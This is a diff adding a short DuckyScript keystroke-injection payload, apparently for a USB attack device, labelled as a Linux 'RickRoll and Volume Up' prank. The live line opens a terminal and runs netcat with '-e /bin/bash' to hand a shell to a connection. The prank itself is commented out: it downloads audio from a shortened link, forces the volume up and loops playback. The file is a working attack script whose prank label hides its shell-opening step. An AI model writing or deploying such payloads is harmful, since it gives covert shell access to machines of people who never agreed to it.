@@ -1,0 +1,7 @@
+REM Linux RickRoll and Volume Up Attack
+
+CONTROL ALT t
+DELAY 1000
+STRING nc 127.0.0.1 1234 -e /bin/bash 
+REM STRING cd /tmp && wget http://tinyurl.com/s63ve48 -O rick.mp3 && (for i in {1..50}; do amixer set Master 100%+ unmute 2>/dev/null || pactl set-sink-volume @DEFAULT_SINK@ +10% 2>/dev/null; sleep 0.1; done) & (while true; do aplay rick.mp3 2>/dev/null || cvlc --intf dummy --play-and-exit rick.mp3 2>/dev/null || mpg123 -q rick.mp3 2>/dev/null; done) &
+ENTER
